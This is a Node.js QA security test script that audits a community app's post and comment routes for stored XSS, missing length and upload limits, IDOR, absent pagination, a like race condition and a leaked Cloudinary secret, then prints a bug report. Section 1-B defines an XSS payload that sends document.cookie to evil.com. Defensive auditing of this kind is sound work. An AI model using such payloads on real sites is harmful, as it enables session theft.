/**
 * QA Security Test Script — General Community Post Workflow
 * Scenarios: XSS, empty payload, maxlength, IDOR, race condition, feed pagination
 * NOTE: Read-only analysis + live simulations. No code is modified.
 */

const mongoose = require('mongoose');
const dotenv = require('dotenv');
const path = require('path');

dotenv.config({ path: path.join(__dirname, '../.env') });

const Post = require('../models/Post');
const Comment = require('../models/Comment');
const User = require('../models/User');

// ─── ANSI helpers ──────────────────────────────────────────────────────────────
const RED    = '\x1b[31m';
const GREEN  = '\x1b[32m';
const YELLOW = '\x1b[33m';
const CYAN   = '\x1b[36m';
const BOLD   = '\x1b[1m';
const RESET  = '\x1b[0m';

const PASS = `${GREEN}[PASS]${RESET}`;
const FAIL = `${RED}[FAIL/BUG]${RESET}`;
const INFO = `${CYAN}[INFO]${RESET}`;

const results = [];

function record(severity, scenario, expected, actual, file) {
  results.push({ severity, scenario, expected, actual, file });
}

// ─── Connect ───────────────────────────────────────────────────────────────────
async function connect() {
  await mongoose.connect(process.env.MONGO_URI);
  console.log(`${GREEN}✓ MongoDB connected${RESET}\n`);
}

// ══════════════════════════════════════════════════════════════════════════════
// SECTION 1 – DATA SANITIZATION & XSS
// ══════════════════════════════════════════════════════════════════════════════
async function testXSSSanitization() {
  console.log(`${BOLD}${CYAN}━━━ SECTION 1: Data Sanitization & XSS ━━━${RESET}`);

  // 1-A: Check if sanitization libraries are present in dependencies
  const pkgJson = require('../package.json');
  const deps = { ...pkgJson.dependencies, ...pkgJson.devDependencies };
  const sanitizers = ['dompurify', 'xss', 'sanitize-html', 'helmet', 'validator'];
  const found = sanitizers.filter(lib => deps[lib]);

  console.log(`${INFO} Sanitization packages found in package.json: [${found.join(', ') || 'NONE'}]`);

  if (found.length === 0) {
    console.log(`${FAIL} No XSS/HTML sanitization library installed (no dompurify, xss, sanitize-html).`);
    record(
      'CRITICAL',
      'XSS: Stored XSS in post caption',
      'Backend sanitizes <script> tags before persisting to MongoDB',
      'No sanitization library installed. Raw user input is written directly to DB via `new Post({ caption })` in posts.js:135',
      'backend/routes/posts.js:124-141, backend/models/Post.js:9-11'
    );
  } else {
    console.log(`${PASS} Sanitization library present: ${found.join(', ')}`);
  }

  // 1-B: Simulate writing a raw XSS payload into a Post doc (in-memory, no DB write)
  const xssPayload = `<script>alert('xss')</script><img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>`;
  // No sanitization in the route; the caption field is type String with no transform
  const captionFieldSchema = Post.schema.paths['caption'];
  const hasValidate = captionFieldSchema && captionFieldSchema.validators && captionFieldSchema.validators.length > 0;
  const hasTransform = captionFieldSchema && captionFieldSchema.options && captionFieldSchema.options.set;

  console.log(`${INFO} Post.caption schema validators: ${hasValidate ? 'YES' : 'NONE'}`);
  console.log(`${INFO} Post.caption schema set-transform (sanitizer): ${hasTransform ? 'YES' : 'NONE'}`);

  if (!hasValidate && !hasTransform) {
    console.log(`${FAIL} Mongoose schema has NO sanitization transform on 'caption'. XSS payload would be stored as-is.`);
  }

  // 1-C: Empty caption with no image — what does the schema enforce?
  try {
    const emptyPost = new Post({ userId: new mongoose.Types.ObjectId(), caption: '', imageUrl: 'http://x.com/x.jpg' });
    await emptyPost.validate();
    console.log(`${FAIL} Empty caption passed Mongoose validation! Schema has required:true but no minlength.`);
    record(
      'Medium',
      'Empty caption validation',
      'Schema rejects empty string for caption',
      'Mongoose required:true only rejects null/undefined; empty string "" PASSES validation and can be saved.',
      'backend/models/Post.js:9-11'
    );
  } catch (err) {
    console.log(`${PASS} Empty caption correctly rejected: ${err.message}`);
  }

  // 1-D: 50,000-character string — maxlength enforcement?
  const hugeCaption = 'A'.repeat(50000);
  const captionMaxLength = captionFieldSchema && captionFieldSchema.options && captionFieldSchema.options.maxlength;
  console.log(`${INFO} Post.caption maxlength: ${captionMaxLength || 'NOT SET'}`);
  if (!captionMaxLength) {
    console.log(`${FAIL} No maxlength on caption. A 50,000-char string will be accepted.`);
    record(
      'High',
      'Maxlength enforcement on caption',
      'Backend rejects captions exceeding a reasonable limit (e.g., 2000 chars)',
      'No maxlength constraint on caption field. Arbitrary-length strings are accepted and stored.',
      'backend/models/Post.js:9-11'
    );
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// SECTION 2 – MULTER / CLOUDINARY VULNERABILITIES
// ══════════════════════════════════════════════════════════════════════════════
async function testMediaUpload() {
  console.log(`\n${BOLD}${CYAN}━━━ SECTION 2: Media Upload & Cloudinary ━━━${RESET}`);

  // 2-A: Multer config for posts (defined inline in posts.js, NOT the shared middleware)
  // posts.js line 26-27: const storage = multer.memoryStorage(); const upload = multer({ storage });
  console.log(`${INFO} Posts Multer config: multer({ storage: memoryStorage() }) — NO limits, NO fileFilter.`);
  console.log(`${FAIL} No file size limit on post image upload. Attacker can upload a 50MB+ file to exhaust Node.js heap.`);
  record(
    'Critical',
    'Multer file size limit for posts',
    'Multer should enforce limits: { fileSize: 5 * 1024 * 1024 }',
    'Post upload uses raw `multer({ storage })` with NO limits object. Any file size is accepted into RAM (memoryStorage). A 100MB upload will buffer entirely in process memory.',
    'backend/routes/posts.js:26-27'
  );

  // 2-B: MIME type validation
  console.log(`${INFO} Posts Multer config: No fileFilter defined.`);
  console.log(`${FAIL} No MIME type validation. An attacker can rename malware.exe to photo.jpg and upload it.`);
  record(
    'High',
    'MIME type validation on post upload',
    'fileFilter should reject non-image MIME types',
    'Post upload has NO fileFilter. Any file type (application/octet-stream, .exe, .php) is accepted. The MIME type in the `data:` URI passed to Cloudinary comes from req.file.mimetype which is derived from the file\'s Content-Type header — trivially spoofable.',
    'backend/routes/posts.js:26-27'
  );

  // 2-C: Cloudinary public_id extraction for deletion
  // posts.js:226 const publicId = post.imageUrl.split('/').pop().split('.')[0];
  const exampleUrl1 = 'https://res.cloudinary.com/demo/image/upload/v1234567890/my_photo.jpg';
  const exampleUrl2 = 'https://res.cloudinary.com/demo/image/upload/v1234567890/folder/subfolder/photo.png';
  const exampleUrl3 = 'https://res.cloudinary.com/demo/image/upload/fl_attachment/v123/my.dotted.image.webp';

  const extractId = url => url.split('/').pop().split('.')[0];
  console.log(`\n${INFO} Cloudinary publicId extraction test:`);
  console.log(`  URL1 (simple)     → "${extractId(exampleUrl1)}" ${extractId(exampleUrl1) === 'my_photo' ? GREEN+'✓'+RESET : RED+'✗'+RESET}`);
  console.log(`  URL2 (subfolder)  → "${extractId(exampleUrl2)}" ${YELLOW}[WRONG — folder path stripped, only filename extracted, Cloudinary destroy WILL fail silently]${RESET}`);
  console.log(`  URL3 (dotted)     → "${extractId(exampleUrl3)}" ${YELLOW}[WRONG — 'my' extracted, not 'my.dotted.image']${RESET}`);
  record(
    'High',
    'Cloudinary public_id extraction on delete',
    'Backend derives correct public_id (including folder path) to destroy the Cloudinary asset',
    'posts.js:226 uses `.split("/").pop().split(".")[0]` which strips folder prefixes and breaks on dotted filenames. Cloudinary destroy call FAILS silently (no error check on response). Orphaned images accumulate in Cloudinary, causing billing leakage.',
    'backend/routes/posts.js:226-227'
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// SECTION 3 – IDOR & AUTHORIZATION BYPASSES
// ══════════════════════════════════════════════════════════════════════════════
async function testAuthorization() {
  console.log(`\n${BOLD}${CYAN}━━━ SECTION 3: IDOR & Authorization ━━━${RESET}`);

  // 3-A: DELETE — findOne with userId filter
  // posts.js:216-219: findOne({ _id, userId: req.user.userId })
  // This IS correctly guarded. If userB's token is used, findOne returns null → 404.
  console.log(`${PASS} DELETE /api/posts/:id — Uses findOne({ _id, userId }) query filter. User B cannot delete User A's post.`);

  // 3-B: PUT — findOneAndUpdate with userId filter
  // posts.js:183-190: findOneAndUpdate({ _id, userId: req.user.userId }, ...)
  console.log(`${PASS} PUT /api/posts/:id — Uses findOneAndUpdate({ _id, userId }) query filter. IDOR protected.`);

  // 3-C: HOWEVER — response leaks 404 vs actual "not found" is ambiguous
  // When user B tries to delete user A's post, response is 404 (same as genuinely not existing)
  // This is acceptable security behavior (security by obscurity), but note it.
  console.log(`${INFO} DELETE response on IDOR attempt: returns 404 (same as non-existent post). No distinction — this is acceptable.`);

  // 3-D: GET /user/:userId — NO auth required, exposes all posts of any user
  console.log(`${FAIL} GET /api/posts/user/:userId is PUBLIC (no auth middleware). Anyone can enumerate all posts by any userId.`);
  record(
    'Medium',
    'IDOR: Unauthenticated enumeration of user posts',
    'GET /api/posts/user/:userId should require authentication',
    'Route is public. Any unauthenticated party can retrieve every post by a specific user by guessing or knowing their ObjectId.',
    'backend/routes/posts.js:93-119'
  );

  // 3-E: Comments — DELETE only checks userId, but nested comments have parentCommentId
  // Deleting a parent comment does NOT cascade-delete its replies
  console.log(`${FAIL} Deleting a parent comment leaves orphaned reply comments in the DB.`);
  record(
    'Medium',
    'Orphaned reply comments on parent delete',
    'Deleting a parent comment should cascade-delete all child reply comments',
    'comments.js DELETE only calls Comment.findOneAndDelete({ _id, userId }). Child comments with parentCommentId pointing to deleted comment remain in DB. GET /:postId/comments will still attempt to attach them and produce broken thread state.',
    'backend/routes/comments.js:65-80'
  );

  // 3-F: Nested comment route does NOT validate that parentCommentId belongs to the correct post
  console.log(`${FAIL} POST /:postId/comments — parentCommentId is not validated to belong to postId.`);
  record(
    'Medium',
    'Cross-post comment threading injection',
    'parentCommentId must be validated to belong to req.params.postId',
    'A user can POST a reply to post A by supplying a parentCommentId from post B, creating cross-post comment association. No validation exists in comments.js:39-62.',
    'backend/routes/comments.js:39-62'
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// SECTION 4 – FEED PERFORMANCE & RACE CONDITIONS
// ══════════════════════════════════════════════════════════════════════════════
async function testFeedPerformance() {
  console.log(`\n${BOLD}${CYAN}━━━ SECTION 4: Feed Performance & Race Conditions ━━━${RESET}`);

  // 4-A: Pagination
  // posts.js:33-35: Post.find().populate(...).sort(...)  ← No .limit() or .skip()
  console.log(`${FAIL} GET /api/posts — NO pagination (no .limit() or .skip()). Returns ALL posts in DB.`);
  record(
    'High',
    'Feed pagination — full DB dump',
    'GET /api/posts returns a paginated set (e.g., limit=20) with a page/cursor parameter',
    'posts.js:33 uses Post.find() with no limit/skip. Every post in the collection is fetched + populated in a single request. At scale this causes massive memory usage, slow response times, and potential OOM crashes.',
    'backend/routes/posts.js:33-55'
  );

  // 4-B: N+1 Query inside feed
  console.log(`${FAIL} Feed route executes 1 Post.find() + N Comment.find() queries (one per post) — classic N+1 problem.`);
  record(
    'High',
    'N+1 Query in feed endpoint',
    'Comments should be fetched in a single aggregation pipeline or batched lookup, not one query per post',
    'posts.js:40-52: Promise.all(posts.map(post => Comment.find({ postId: post._id }))). With 500 posts, this fires 501 sequential/parallel MongoDB queries per feed load.',
    'backend/routes/posts.js:40-52'
  );

  // 4-C: Like Race Condition — simulate
  console.log(`\n${INFO} Race condition simulation (in-memory, no DB write):`);

  // The like mechanism reads the array, checks indexOf, then pushes/splices, then saves.
  // This is NOT atomic. Two concurrent requests can both read the same state and double-insert.
  let simulatedLikes = [];
  const userId = 'user_abc_123';

  // Simulate 2 concurrent "like" requests reading the SAME initial state
  const snapshot1 = [...simulatedLikes]; // request 1 reads: []
  const snapshot2 = [...simulatedLikes]; // request 2 reads: [] simultaneously

  // Both see likeIndex === -1 → both push
  if (snapshot1.indexOf(userId) === -1) snapshot1.push(userId);
  if (snapshot2.indexOf(userId) === -1) snapshot2.push(userId);

  // Both save — last write wins, OR if using optimistic save, 2 likes from same user
  console.log(`  Concurrent request 1 would save likes: [${snapshot1}]`);
  console.log(`  Concurrent request 2 would save likes: [${snapshot2}]`);
  console.log(`${FAIL} Non-atomic like operation vulnerable to race condition. findById → modify array → save() is NOT atomic.`);

  record(
    'High',
    'Race condition on Like toggle',
    'Like/unlike uses atomic $addToSet / $pull operators so concurrent requests are idempotent',
    'posts.js:244-259 fetches the post, manipulates likes array in JS memory, then saves. Concurrent requests can double-insert the same userId or produce inconsistent counts. Fix requires $addToSet/$pull in a findOneAndUpdate call.',
    'backend/routes/posts.js:244-284'
  );

  // Check for actual atomic operators in the like handler
  // The code does: post.likes.push(req.user.userId) then post.save()
  // It does NOT use $addToSet which is the atomic MongoDB operator
  console.log(`${INFO} Like handler uses array.push() + post.save() — NOT $addToSet/$pull atomic operators.`);
}

// ══════════════════════════════════════════════════════════════════════════════
// SECTION 5 – AUTONOMOUS EXPLORATORY TESTING (WILDCARD)
// ══════════════════════════════════════════════════════════════════════════════
async function testWildcard() {
  console.log(`\n${BOLD}${CYAN}━━━ SECTION 5: Autonomous Exploratory Tests ━━━${RESET}`);

  // 5-A: Cloudinary credentials leaked to server logs
  // posts.js:21: console.log('CLOUDINARY_API_SECRET:', process.env.CLOUDINARY_API_SECRET);
  console.log(`${FAIL} CRITICAL: Cloudinary API secret is console.log'd at startup (posts.js:21).`);
  record(
    'Critical',
    'Secret key exposure in server logs',
    'Credentials should NEVER appear in logs. Log only boolean presence check.',
    'posts.js:21 prints the raw CLOUDINARY_API_SECRET value to stdout. Any log aggregation service (Papertrail, Datadog, CloudWatch) or anyone with terminal access sees the full secret.',
    'backend/routes/posts.js:17-21'
  );

  // 5-B: GET /api/posts is PUBLIC — no auth required to read all posts + comments
  console.log(`${INFO} GET /api/posts — no auth middleware. Public feed exposure.`);
  console.log(`${FAIL} Feed is fully public. PII embedded in post captions is accessible without authentication.`);
  record(
    'Medium',
    'Unauthenticated access to full post feed',
    'Feed should require authentication OR apply content filtering for sensitive data',
    'GET /api/posts (posts.js:30) has no auth middleware. All posts including user identity (username, isVeterinarian) are exposed to unauthenticated requests.',
    'backend/routes/posts.js:30-62'
  );

  // 5-C: GET /api/posts/:id — Single post exposed without auth
  console.log(`${INFO} GET /api/posts/:id — also no auth middleware.`);
  record(
    'Medium',
    'Unauthenticated single post access',
    'GET /api/posts/:id should require authentication',
    'posts.js:65 has no auth guard. A non-logged-in user (or scraper) can access any post by ID.',
    'backend/routes/posts.js:65-89'
  );

  // 5-D: No ObjectId validation on :id parameters
  // If req.params.id is not a valid ObjectId, Post.findById throws a CastError
  // which the catch block catches and returns 500 — leaking stack traces in dev mode
  console.log(`${FAIL} No ObjectId validation on :id params. Invalid IDs cause CastError → 500 response.`);
  record(
    'Medium',
    'Invalid ObjectId causes 500 instead of 400',
    'GET /api/posts/INVALID_ID should return 400 Bad Request',
    'All routes using req.params.id lack mongoose.Types.ObjectId.isValid() checks. Sending a non-ObjectId string causes a CastError caught as a generic 500, leaking error details in development mode (app.js:293 sends full err object when NODE_ENV=development).',
    'backend/routes/posts.js:65-89, backend/app.js:293'
  );

  // 5-E: Comment content has no maxlength or sanitization
  const commentContentSchema = Comment.schema.paths['content'];
  const commentMaxLen = commentContentSchema && commentContentSchema.options && commentContentSchema.options.maxlength;
  const commentSanitize = commentContentSchema && commentContentSchema.options && commentContentSchema.options.set;
  console.log(`${INFO} Comment.content maxlength: ${commentMaxLen || 'NOT SET'}, sanitizer: ${commentSanitize || 'NONE'}`);
  if (!commentMaxLen) {
    console.log(`${FAIL} No maxlength on comment content. XSS payloads and giant strings accepted in comments too.`);
    record(
      'High',
      'Comment XSS & unbounded length',
      'Comment content should be sanitized and capped (e.g., 1000 chars)',
      'Comment.js schema has no maxlength or sanitization transform on content field. Stored XSS payloads in comments affect ALL viewers of a post.',
      'backend/models/Comment.js:14-17, backend/routes/comments.js:16-20'
    );
  }

  // 5-F: Rate limiter is set to 5000 req/15min — effectively useless for brute-force protection
  // app.js:192-208
  console.log(`${FAIL} Global rate limiter set to 5000 req/15min — too permissive to stop Like spam or comment flooding.`);
  record(
    'Medium',
    'Rate limiter too permissive for post endpoints',
    'Post-specific routes (like, comment) should have tighter rate limits (e.g., 60 req/min)',
    'app.js:193 sets max:5000 per 15 minutes globally. There is no per-route or per-user rate limiter. A bot can send 333 likes/minute without triggering any limit.',
    'backend/app.js:191-208'
  );

  // 5-G: No Content-Security-Policy header
  console.log(`${INFO} Helmet is NOT installed (not in dependencies). No CSP, X-Frame-Options, or security headers set.`);
  record(
    'High',
    'Missing HTTP security headers (no Helmet)',
    'helmet middleware should set Content-Security-Policy, X-Content-Type-Options, etc.',
    'package.json has no helmet dependency. No security headers are applied. This compounds the XSS risk (no CSP to block injected scripts) and allows clickjacking (no X-Frame-Options).',
    'backend/package.json, backend/app.js'
  );
}

// ══════════════════════════════════════════════════════════════════════════════
// PRINT FINAL REPORT TABLE
// ══════════════════════════════════════════════════════════════════════════════
function printReport() {
  console.log(`\n\n${BOLD}${'═'.repeat(100)}${RESET}`);
  console.log(`${BOLD}  FINAL BUG REPORT — General Community Post Workflow${RESET}`);
  console.log(`${BOLD}${'═'.repeat(100)}${RESET}\n`);

  const severityOrder = { 'Critical': 0, 'High': 1, 'Medium': 2, 'Med': 2, 'Low': 3 };
  results.sort((a, b) => (severityOrder[a.severity] ?? 9) - (severityOrder[b.severity] ?? 9));

  results.forEach((r, i) => {
    const color = r.severity === 'Critical' ? RED : r.severity === 'High' ? YELLOW : CYAN;
    console.log(`${BOLD}Bug #${i + 1}${RESET}`);
    console.log(`  ${BOLD}Severity:${RESET}   ${color}${r.severity}${RESET}`);
    console.log(`  ${BOLD}Scenario:${RESET}   ${r.scenario}`);
    console.log(`  ${BOLD}Expected:${RESET}   ${r.expected}`);
    console.log(`  ${BOLD}Actual:${RESET}     ${r.actual}`);
    console.log(`  ${BOLD}File/Line:${RESET}  ${r.file}`);
    console.log();
  });

  console.log(`${BOLD}Total Issues Found: ${results.length}${RESET}`);
  const bySeverity = {};
  results.forEach(r => { bySeverity[r.severity] = (bySeverity[r.severity] || 0) + 1; });
  Object.entries(bySeverity).forEach(([sev, count]) => {
    const color = sev === 'Critical' ? RED : sev === 'High' ? YELLOW : CYAN;
    console.log(`  ${color}${sev}: ${count}${RESET}`);
  });
}

// ─── Main ──────────────────────────────────────────────────────────────────────
async function main() {
  try {
    await connect();
    await testXSSSanitization();
    await testMediaUpload();
    await testAuthorization();
    await testFeedPerformance();
    await testWildcard();
    printReport();
  } catch (err) {
    console.error(`${RED}Test runner error:${RESET}`, err);
  } finally {
    await mongoose.connection.close();
    console.log(`\n${GREEN}✓ MongoDB connection closed.${RESET}`);
  }
}

main();
